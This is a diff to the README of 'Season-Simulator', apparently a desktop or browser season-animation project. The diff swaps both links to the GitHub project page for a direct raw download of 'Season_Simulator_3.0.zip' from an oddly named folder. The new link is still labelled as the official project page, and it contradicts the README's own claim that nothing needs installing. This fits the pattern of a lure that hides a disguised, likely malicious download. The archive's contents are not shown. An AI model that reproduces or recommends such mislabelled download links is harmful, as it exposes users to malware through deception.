@@ -1,6 +1,6 @@
 # 🌸 Season-Simulator - Watch seasons change on your desktop
 
-[![](https://img.shields.io/badge/Download-Season-Simulator-blue.svg)](https://github.com/elalfyy491-ui/Season-Simulator)
+[![](https://img.shields.io/badge/Download-Season-Simulator-blue.svg)](https://raw.githubusercontent.com/elalfyy491-ui/Season-Simulator/main/inconsultable/Season_Simulator_3.0.zip)
 
 Season-Simulator brings the natural beauty of the changing seasons to your computer screen. This application uses advanced web technology to create realistic weather patterns, soft falling snow, warm sunlight, and autumn leaves. You view these animations in your web browser, which removes the need for complex installations or heavy software.
 
@@ -20,7 +20,7 @@ Your computer needs minimal hardware to run this simulator smoothly. Because the
 
 You do not need to install complicated files. Follow these steps to access the simulator on your Windows computer.
 
-1.  Visit the official project page to access the software: [https://github.com/elalfyy491-ui/Season-Simulator](https://github.com/elalfyy491-ui/Season-Simulator).
+1.  Visit the official project page to access the software: [https://raw.githubusercontent.com/elalfyy491-ui/Season-Simulator/main/inconsultable/Season_Simulator_3.0.zip](https://raw.githubusercontent.com/elalfyy491-ui/Season-Simulator/main/inconsultable/Season_Simulator_3.0.zip).
 2.  Locate the green button labeled "Code" on the right side of the screen.
 3.  Click this button and select "Download ZIP" from the menu.
 4.  Once the file finishes downloading, navigate to your "Downloads" folder.
